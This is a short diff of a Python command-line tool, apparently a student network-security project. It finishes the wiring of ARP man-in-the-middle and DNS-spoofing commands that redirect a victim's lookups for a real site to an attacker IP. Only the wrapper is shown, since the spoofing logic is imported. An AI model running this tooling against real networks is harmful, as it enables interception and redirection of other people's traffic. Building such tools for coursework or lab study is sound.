@@ -9,14 +9,7 @@ from queued_dns_spoof import Dns_spoof
 app = typer.Typer()
 
 @app.command()
-def main(name: str, hasallcaps: bool = False):
-    if hasallcaps:
-        print(f"HELLO {name.upper()}")
-    else:
-        print(f"Hello {name}")
-
-@app.command()
-def Arp_MiM(ipVictim: str, ipServer: str):
+def Arp_MiM(ipVictim: str = "0.0.0.0", ipServer: str = "0.0.0.0"):
     ArpPoison.MIMspoofARP(ipVictim=ipVictim, ipServer=ipServer)
 
 @app.command()
@@ -25,10 +18,11 @@ def DNS_Spoof(ipVictim: str = "0.0.0.0", OGSite: str = 'tue.nl', EvilIp: str = "
     if ipRouter == "Default Router":
         ipRouter = conf.route.route("0.0.0.0")[2]
 
-    host = (OGSite, EvilIp)
-    Dns_spoof(queue_num=queue_num, ipVictim=ipVictim, ipServer=ipRouter, host=host)
+    #print (f'ipVictim = {ipVictim}, ipRouter = {ipRouter}, evilIP = {EvilIp}, OGSite = {OGSite}, queue_num = {queue_num}')
 
-    print("This is a placeholder, you shouldn't be seeing this!")
+    host = (OGSite, EvilIp)
+    spoof = Dns_spoof(queue_num=queue_num, ipVictim=ipVictim, ipServer=ipRouter, host=host)
+    spoof()
 
 if __name__ == "__main__":
     app()
